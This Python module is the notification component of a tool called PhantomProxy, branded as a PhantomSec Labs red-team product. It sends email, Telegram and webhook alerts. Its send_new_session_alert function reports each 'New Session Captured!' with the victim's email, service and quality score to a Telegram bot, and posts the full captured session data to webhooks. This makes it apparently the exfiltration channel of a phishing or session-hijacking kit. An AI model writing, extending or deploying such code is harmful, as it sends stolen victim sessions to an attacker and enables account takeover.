#!/usr/bin/env python3
"""
PhantomProxy v12.4 PRO+++ — Notification System
Email, Telegram, Webhook уведомления

© 2026 PhantomSec Labs. All rights reserved.
"""

import smtplib
import requests
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from pathlib import Path

# === КОНФИГУРАЦИЯ ===
NOTIFICATIONS_PATH = Path(__file__).parent / 'notifications'
NOTIFICATIONS_PATH.mkdir(exist_ok=True)

class NotificationManager:
    """Менеджер уведомлений"""
    
    def __init__(self):
        # Email config (заполняется пользователем)
        self.smtp_config = {
            'server': 'smtp.gmail.com',
            'port': 587,
            'username': '',
            'password': '',
            'from_email': '',
            'from_name': 'PhantomSec Labs'
        }
        
        # Telegram config
        self.telegram_config = {
            'bot_token': '',
            'chat_id': ''
        }
        
        # Webhook config
        self.webhook_urls = []
    
    def configure_email(self, smtp_server, smtp_port, username, password, from_email, from_name='PhantomSec Labs'):
        """Настройка Email"""
        self.smtp_config = {
            'server': smtp_server,
            'port': smtp_port,
            'username': username,
            'password': password,
            'from_email': from_email,
            'from_name': from_name
        }
        return {'success': True, 'message': 'Email configured'}
    
    def configure_telegram(self, bot_token, chat_id):
        """Настройка Telegram"""
        self.telegram_config = {
            'bot_token': bot_token,
            'chat_id': chat_id
        }
        return {'success': True, 'message': 'Telegram configured'}
    
    def add_webhook(self, url):
        """Добавление webhook"""
        self.webhook_urls.append(url)
        return {'success': True, 'message': f'Webhook added: {url}'}
    
    def send_email(self, to_email, subject, body, attachments=None):
        """Отправка Email"""
        if not self.smtp_config['username']:
            return {'success': False, 'error': 'Email not configured'}
        
        try:
            msg = MIMEMultipart()
            msg['From'] = f"{self.smtp_config['from_name']} <{self.smtp_config['from_email']}>"
            msg['To'] = to_email
            msg['Subject'] = subject
            
            msg.attach(MIMEText(body, 'html'))
            
            # Attachments
            if attachments:
                for file_path in attachments:
                    try:
                        with open(file_path, 'rb') as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                            encoders.encode_base64(part)
                            part.add_header(
                                'Content-Disposition',
                                f'attachment; filename={Path(file_path).name}'
                            )
                            msg.attach(part)
                    except Exception as e:
                        print(f"Warning: Could not attach {file_path}: {e}")
            
            # Send
            server = smtplib.SMTP(self.smtp_config['server'], self.smtp_config['port'])
            server.starttls()
            server.login(self.smtp_config['username'], self.smtp_config['password'])
            server.send_message(msg)
            server.quit()
            
            self._log_notification('email', to_email, subject, 'success')
            
            return {'success': True, 'message': f'Email sent to {to_email}'}
        
        except Exception as e:
            self._log_notification('email', to_email, subject, f'failed: {e}')
            return {'success': False, 'error': str(e)}
    
    def send_telegram(self, message, parse_mode='HTML'):
        """Отправка Telegram"""
        if not self.telegram_config['bot_token']:
            return {'success': False, 'error': 'Telegram not configured'}
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_config['bot_token']}/sendMessage"
            data = {
                'chat_id': self.telegram_config['chat_id'],
                'text': message,
                'parse_mode': parse_mode
            }
            
            response = requests.post(url, json=data, timeout=10)
            result = response.json()
            
            if result.get('ok'):
                self._log_notification('telegram', self.telegram_config['chat_id'], message[:50], 'success')
                return {'success': True, 'message': 'Telegram message sent'}
            else:
                error = result.get('description', 'Unknown error')
                self._log_notification('telegram', self.telegram_config['chat_id'], message[:50], f'failed: {error}')
                return {'success': False, 'error': error}
        
        except Exception as e:
            self._log_notification('telegram', self.telegram_config['chat_id'], message[:50], f'failed: {e}')
            return {'success': False, 'error': str(e)}
    
    def send_webhook(self, payload):
        """Отправка webhook"""
        results = []
        
        for url in self.webhook_urls:
            try:
                response = requests.post(url, json=payload, timeout=10)
                results.append({
                    'url': url,
                    'status': response.status_code,
                    'success': response.ok
                })
                self._log_notification('webhook', url, str(payload)[:50], 'success' if response.ok else 'failed')
            except Exception as e:
                results.append({
                    'url': url,
                    'success': False,
                    'error': str(e)
                })
                self._log_notification('webhook', url, str(payload)[:50], f'failed: {e}')
        
        return {'success': True, 'results': results}
    
    def send_campaign_alert(self, campaign_name, event_type, details=None):
        """Отправка алерта о кампании"""
        emoji = {
            'started': '🚀',
            'completed': '✅',
            'paused': '⏸️',
            'error': '❌',
            'milestone': '🎯'
        }.get(event_type, '📢')
        
        # Telegram
        telegram_msg = f"""
{emoji} <b>Campaign Alert</b>

<b>Campaign:</b> {campaign_name}
<b>Event:</b> {event_type}
<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{details or ''}
        """.strip()
        
        self.send_telegram(telegram_msg)
        
        # Webhook
        self.send_webhook({
            'type': 'campaign_alert',
            'campaign': campaign_name,
            'event': event_type,
            'details': details,
            'timestamp': datetime.now().isoformat()
        })
    
    def send_new_session_alert(self, session_data):
        """Отправка алерта о новой сессии"""
        emoji = '🎯'
        
        # Telegram
        telegram_msg = f"""
{emoji} <b>New Session Captured!</b>

<b>Email:</b> <code>{session_data.get('email', 'N/A')}</code>
<b>Service:</b> {session_data.get('service', 'N/A')}
<b>Quality:</b> {session_data.get('classification', 'N/A')}
<b>Score:</b> {session_data.get('quality_score', 'N/A')}/100
<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """.strip()
        
        self.send_telegram(telegram_msg)
        
        # Webhook
        self.send_webhook({
            'type': 'new_session',
            'session': session_data,
            'timestamp': datetime.now().isoformat()
        })
    
    def send_report_email(self, to_email, report_path, campaign_name):
        """Отправка отчёта по Email"""
        subject = f"Red Team Report — {campaign_name}"
        
        body = f"""
<html>
<body>
    <h2>PhantomSec Labs — Campaign Report</h2>
    <p>Please find attached the report for campaign: <b>{campaign_name}</b></p>
    <p>This report contains:</p>
    <ul>
        <li>Executive Summary</li>
        <li>Session Statistics</li>
        <li>Quality Analysis</li>
        <li>Recommendations</li>
    </ul>
    <p>Best regards,<br/>
    <b>PhantomSec Labs Team</b></p>
    <p style="color: #666; font-size: 12px;">
        {self.smtp_config['from_email']} | {self.smtp_config['from_name']}
    </p>
</body>
</html>
        """
        
        return self.send_email(to_email, subject, body, attachments=[report_path])
    
    def _log_notification(self, notification_type, recipient, subject, status):
        """Логирование уведомлений"""
        log_file = NOTIFICATIONS_PATH / f"notifications_{datetime.now().strftime('%Y%m%d')}.log"
        
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'type': notification_type,
            'recipient': recipient,
            'subject': subject,
            'status': status
        }
        
        with open(log_file, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')

# === TEST ===
if __name__ == '__main__':
    print("PhantomProxy v12.4 PRO+++ — Notification System")
    print("="*60)
    
    manager = NotificationManager()
    print("✅ Notification Manager initialized")
    
    # Test configuration
    print("\n📧 Configuring Email (example)...")
    print("   Use: manager.configure_email('smtp.gmail.com', 587, 'user@gmail.com', 'password', 'from@test.com')")
    
    print("\n📱 Configuring Telegram (example)...")
    print("   Use: manager.configure_telegram('BOT_TOKEN', 'CHAT_ID')")
    
    print("\n🔗 Adding Webhook (example)...")
    manager.add_webhook('https://hooks.slack.com/services/YOUR/WEBHOOK/URL')
    print("   ✅ Webhook added")
    
    # Test templates
    print("\n📨 Notification Templates:")
    print("   - send_campaign_alert(campaign_name, event_type, details)")
    print("   - send_new_session_alert(session_data)")
    print("   - send_report_email(to_email, report_path, campaign_name)")
    print("   - send_email(to_email, subject, body, attachments)")
    print("   - send_telegram(message)")
    print("   - send_webhook(payload)")
    
    print("\n✅ All notification features ready!")
